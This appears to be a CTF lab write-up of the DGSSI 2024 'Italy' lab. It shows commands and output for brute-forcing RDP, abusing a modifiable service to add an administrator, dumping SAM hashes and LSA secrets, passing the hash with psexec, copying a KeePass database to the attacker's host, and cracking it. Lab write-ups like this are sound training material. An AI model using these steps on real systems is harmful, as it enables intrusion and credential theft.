---

layout: post

title: DGSSI CTF PRO 2024 - Italy Writeup

categories: [Machine, Writeup, CTF]

tags: [DGSSI, CTF, Writeup]

author:

    name: BaadMaro

    link: https://baadmaro.github.io

image: /assets/img/posts/DGSSI-CTF-Italy-lab.png

---

The lab was included in the professional **DGSSI** CTF hosed in **SecDojo** platform on February 7, 2024.

[https://www.linkedin.com/showcase/dgssi-ctf-2024/](https://www.linkedin.com/showcase/dgssi-ctf-2024/)

![Pasted image 20240325012305](https://github.com/BaadMaro/baadmaro.github.io/assets/72421091/c0a730c7-21b0-49b6-9d3c-8e271fd7ac5e)

![Pasted image 20240325012341](https://github.com/BaadMaro/baadmaro.github.io/assets/72421091/1d51b3e9-e6b3-443b-9849-d633f40978d4)

# Naples machine

We start our enumeration with a Nmap scan to identify services.
## Nmap scan

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BASTION
|   NetBIOS_Domain_Name: BASTION
|   NetBIOS_Computer_Name: BASTION
|   DNS_Domain_Name: Bastion
|   DNS_Computer_Name: Bastion
|   Product_Version: 10.0.14393
|_  System_Time: 2024-02-07T09:19:47+00:00
|_ssl-date: 2024-02-07T09:19:52+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Bastion
| Not valid before: 2024-02-06T09:12:00
|_Not valid after:  2024-08-07T09:12:00
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-07T09:19:47
|_  start_date: 2024-02-07T09:11:59
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASTION, NetBIOS user: <unknown>, NetBIOS MAC: 00:ff:1b:91:ea:6e (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-07T09:19:47+00:00
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
```

## SMB 

I started by checking smb access using crackmapexec, and I found that an empty user/pass has access to a share called `Users`

```
smbclient \\\\10.8.0.3\\Users -N
```

```
smb: \> ls
  .                                  DR        0  Sat Jan 29 16:01:18 2022
  ..                                 DR        0  Sat Jan 29 16:01:18 2022
  Default                           DHR        0  Mon Jan 24 11:53:01 2022
  desktop.ini                       AHS      174  Sat Jul 16 09:21:29 2016
  Public                             DR        0  Wed Feb  7 04:18:26 2024
```

I start downloading all the files from the share to inspect them

```
smb: \Public\> prompt OFF
smb: \Public\> recurse ON
smb: \Public\> mget *
getting file \Public\desktop.ini of size 174 as desktop.ini (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Public\local.txt of size 54 as local.txt (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \Public\mark.lnk of size 1068 as mark.lnk (2.5 KiloBytes/sec) (average 1.1 KiloBytes/sec)
getting file \Public\AccountPictures\desktop.ini of size 196 as AccountPictures/desktop.ini (0.5 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Public\Documents\desktop.ini of size 278 as Documents/desktop.ini (0.8 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \Public\Downloads\desktop.ini of size 174 as Downloads/desktop.ini (0.5 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \Public\Libraries\desktop.ini of size 175 as Libraries/desktop.ini (0.5 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \Public\Libraries\RecordedTV.library-ms of size 999 as Libraries/RecordedTV.library-ms (2.7 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Public\Music\desktop.ini of size 380 as Music/desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Public\Pictures\desktop.ini of size 380 as Pictures/desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Public\Videos\desktop.ini of size 380 as Videos/desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \Public\>
```

The files doesn't have any interesting details. We can see an interesting shortcut `\Public\mark.lnk` refereeing  to a potential user called `mark`

I checked first smb with the user `mark` using empty/same user as password, but without success.

## RDP 

We already have RDP, so I bruteforce the password for our user using hydra

```
hydra -l mark -P /usr/share/wordlists/rockyou.txt rdp://10.8.0.3
```

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-07 04:55:17
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking rdp://10.8.0.3:3389/
[STATUS] 381.00 tries/min, 381 tries in 00:01h, 14344018 to do in 627:29h, 4 active
[3389][rdp] host: 10.8.0.3   login: mark   password: pumpkin
```

We have a match with the password `pumpkin`

I logged to the machine using rdesktop and setup a reverse shell to have handy access to the machine

![Pasted image 20240207110046](https://github.com/BaadMaro/baadmaro.github.io/assets/72421091/36a1617c-2f51-4949-906b-c0729a79cc53)

The first flag is located in Desktop/local.txt (if I remember it correctly)

```
Bastion_0x_SHilling-kj1b249mav2qdt8br9xpxlypprfgyo0s
```

Now we need to get access to Administrator to complete the first machine.

## Privilege escalation

When dealing with privilege escalation, I go with PowerUp and winPEAS. I started by uploading them to the machine

```
PS C:\Users\mark> Invoke-WebRequest -Uri http://10.8.0.4:8000/PowerUp.ps1 -OutFile p.ps1
PS C:\Users\mark> Invoke-WebRequest -Uri http://10.8.0.4:8000/winPEASany.exe -OutFile w.exe
```

I checked PowerUp first

```
PS C:\Users\mark> . .\p.ps1
PS C:\Users\mark> Invoke-AllChecks
```

We have a misconfigured `SNMP` service loaded by `LocalSystem` . We can modify the service to inject commands and restart it (CanRestart true) to run it

```
ServiceName   : SNMP
Path          : C:\Windows\System32\snmp.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMP'
CanRestart    : True
Name          : SNMP
Check         : Modifiable Services
```

We can do it using PowerUp or manually. The PowerUp command is `Invoke-ServiceAbuse -Name 'SNMP'`

The abuse command can be modified with a specific command or a specific user/pass created as administrator

This machine was private, I left the default abuse which add an administrator user with `john:Password123!`

```
PS C:\Users\mark> PS C:\Users\mark> Invoke-ServiceAbuse -Name 'SNMP'

ServiceAbused Command                                                                   
------------- -------                                                                   
SNMP          net user john Password123! /add && net localgroup Administrators john /add
```

We can confirm the created user

```
PS C:\Users\mark> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
john
The command completed successfully.
```

## Dump hashes

As we have administrator access, we can dump hashes. I used `impacket-secretsdump`

```
impacket-secretsdump bastion/john:"Password123\!"@10.8.0.3
```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe8f8eb3dae34cbd9d3d9eea96a2cdf99
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:75f93c2abb1e018670a0c8124dda15e7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mark:1008:aad3b435b51404eeaad3b435b51404ee:c429b91ec17f2c752917632bf06af883:::
taylor:1009:aad3b435b51404eeaad3b435b51404ee:2e9f7a4fe52270ad2db1732c6cdb4428:::
john:1010:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6770b89a8dedc96069aa66160a997824ff6910ab
dpapi_userkey:0x5d63f1f7715d08bf3b727e79f23e2d330fab3db2
[*] NL$KM 
 0000   2E 74 ED 55 62 CB 0C 23  83 3D C6 56 51 CE B2 93   .t.Ub..#.=.VQ...
 0010   63 BC 5F C9 59 8B 25 DB  1F FC F9 A2 26 50 31 60   c._.Y.%.....&P1`
 0020   C4 67 C4 47 3B EA D7 01  86 9B 67 31 70 F9 30 A1   .g.G;.....g1p.0.
 0030   49 99 F2 29 6D 19 85 D4  F2 01 BE C0 65 26 19 20   I..)m.......e&. 
NL$KM:2e74ed5562cb0c23833dc65651ceb29363bc5fc9598b25db1ffcf9a226503160c467c4473bead701869b673170f930a14999f2296d1985d4f201bec065261920
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

## Administrator shell

Now I switched to Administrator using `impacket-psexec`

```
impacket-psexec bastion/administrator@10.8.0.3 -hashes "aad3b435b51404eeaad3b435b51404ee:75f93c2abb1e018670a0c8124dda15e7"
```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.8.0.3.....
[*] Found writable share ADMIN$
[*] Uploading file GRYvxaly.exe
[*] Opening SVCManager on 10.8.0.3.....
[*] Creating service Umrf on 10.8.0.3.....
[*] Starting service Umrf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

We got our root flag

```
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is AEC0-6C42

 Directory of C:\Users\Administrator\Desktop

02/07/2024  09:18 AM    <DIR>          .
02/07/2024  09:18 AM    <DIR>          ..
01/29/2022  08:06 PM               951 KeePass 2.lnk
02/07/2024  09:18 AM                54 proof.txt
               2 File(s)          1,005 bytes
               2 Dir(s)  13,638,184,960 bytes free

C:\Users\Administrator\Desktop> type proof.txt
Bastion_0x_SHilling-n6paayngehlwf9a6sobcfi4omj6rvyhm
```

We finished the first machine `Naples`. Now we need to use our access to pivot the second machine `Florence`

# Florence

## Getting the access from Naples machine

While getting the administrator access from our `Naples` machine, I saw a shortcut for KeePass `KeePass 2.lnk` which is a hint to search for the KeePass database file.

```
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is AEC0-6C42

 Directory of C:\Users\Administrator\Desktop

02/07/2024  09:18 AM    <DIR>          .
02/07/2024  09:18 AM    <DIR>          ..
01/29/2022  08:06 PM               951 KeePass 2.lnk
02/07/2024  09:18 AM                54 proof.txt
               2 File(s)          1,005 bytes
               2 Dir(s)  13,638,184,960 bytes free
```

Mark and Administrator already checked. The only one left is Taylor. We have the hash already dumped after the privilege escalation 

```
taylor:1009:aad3b435b51404eeaad3b435b51404ee:2e9f7a4fe52270ad2db1732c6cdb4428:::
```

## Taylor shell

I didn't take a note on how I accessed Taylor's account. It could be using pass the hash with RDP.

Now with a access to Taylor user, I started checking directories

```
PS C:\Users\taylor> tree /f
Folder PATH listing
Volume serial number is 00000200 AEC0:6C42
C:.
????Contacts
????Desktop
?       KeePass - Shortcut.lnk
?       
????Documents
?       Database.kdbx
?       
????Downloads
????Favorites
?   ?   Bing.url
?   ?   
?   ????Links
????Links
?       Desktop.lnk
?       Downloads.lnk
?       
????Music
????Pictures
????Saved Games
????Searches
????Videos
```

We found the KeePass database. I downloaded the database to my machine

```
copy Documents\Database.kdbx \\10.8.0.4\test\database.kdbx
```

The database is protected with a password so we need to crack it

```
kpcli --kdb database.kdbx 
Provide the master password: 
```
## Cracking KeePass database

I extracted the hash using `keepass2john`

```
keepass2john  database.kdbx
```

```
database:$keepass$*2*60000*0*fa25330f0cee5d8599dbaa55f8e7dc712d2448c2904af33033dd114ca051b27b*666fd415d20e5613cadd094129e973e203a10fef79153ec6b00763cf224eb209*4a5e8537a0f1c4554ee49744369bbdea*14b77bfa03e8cf3f9b8616dd80ff0a3b7179467727fca10c5150e188e224be98*2996adaab16d60c01229faa959829820658358e9abcf227eeff42b135c01dba3
```

I loaded the hash without "database:" part for hashcat

```
hashcat -m 13400 hash.txt rockyou.txt
```

Cracked password is `backstreetboys`

Let's explore the database using `kpcli`

```
kpcli --kdb database.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Database/
kpcli:/> ls Database/
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Backup domain account                                                  
1. Domain account                                                         
```

We have two entries with some accounts

```
kpcli:/> show 0

Title: Backup domain account
Uname: SECDOJO\backup
 Pass: NPs1yLXH$
  URL: 
Notes: 

kpcli:/> show 1

Title: Domain account
Uname: SECDOJO\tsilva
 Pass: 8JPmoXL!ds
  URL: 
Notes: 
```

We got working accounts for the machine "Florence" confirmed with SMB
## Nmap scan 

```
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  spark             Apache Spark
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn?
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: secdojo.lab, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds      Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: SECDOJO)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: secdojo.lab, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=Temple.secdojo.lab
| Not valid before: 2024-02-06T09:12:00
|_Not valid after:  2024-08-07T09:12:00
| rdp-ntlm-info: 
|   Target_Name: SECDOJO
|   NetBIOS_Domain_Name: SECDOJO
|   NetBIOS_Computer_Name: TEMPLE
|   DNS_Domain_Name: secdojo.lab
|   DNS_Computer_Name: Temple.secdojo.lab
|   DNS_Tree_Name: secdojo.lab
|   Product_Version: 10.0.14393
|_  System_Time: 2024-02-07T10:41:59+00:00
|_ssl-date: 2024-02-07T10:42:39+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.94SVN%I=7%D=2/7%Time=65C35DF8%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,5,"\x83\0\0\x01\x8f");
Service Info: Host: TEMPLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: Temple
|   NetBIOS computer name: TEMPLE\x00
|   Domain name: secdojo.lab
|   Forest name: secdojo.lab
|   FQDN: Temple.secdojo.lab
|_  System time: 2024-02-07T10:41:59+00:00
|_nbstat: NetBIOS name: TEMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 00:ff:45:d0:b5:96 (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-07T10:41:59
|_  start_date: 2024-02-07T09:12:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.35 seconds
```

## Output

I didn't keep detailed notes for this part, I'll do a recap for it
- SMB shares : backup user has access to a SMB share that has SAM and other registry files that could be used to dump hashes. Also, one of the files was larger and keep crashing the SMB connection while downloading so we can't get it
- I did some recon using `ldapdomaindump`
![Pasted image 20240325005015](https://github.com/BaadMaro/baadmaro.github.io/assets/72421091/d39d6157-8186-4ad5-ac46-efcaf06f57b1)
- Part of users (we have a lot)
![2024-03-25_00h51_50](https://github.com/BaadMaro/baadmaro.github.io/assets/72421091/3c48c7d0-8d1e-4695-ab96-eb4ac93f1762)
- Our user backup is a member of Backup Operators. We can use that to dump SAM and other hives to extract hashes [https://www.bordergate.co.uk/backup-operator-privilege-escalation/](https://www.bordergate.co.uk/backup-operator-privilege-escalation/)
- I was able to get the hives using impacket-reg [https://wadcoms.github.io/wadcoms/Impacket-Reg/](https://wadcoms.github.io/wadcoms/Impacket-Reg/)
- I had issues extracting the hashes from hives using pypykatz and `impacket-secretsdump`. I was also mixing registry files from `imapcket-reg` and the other ones from SMB share so maybe I got some of them corrupted.
- I wasn't able to get it to work so I stopped here to check other labs in the CTF.

The solution is clear after the finding. We need to get the needed registry hives to extract hashes using our backup account which is a member of Backup Operators.

I didn't solve this part, so my approach could be correct or maybe not.

Thanks.

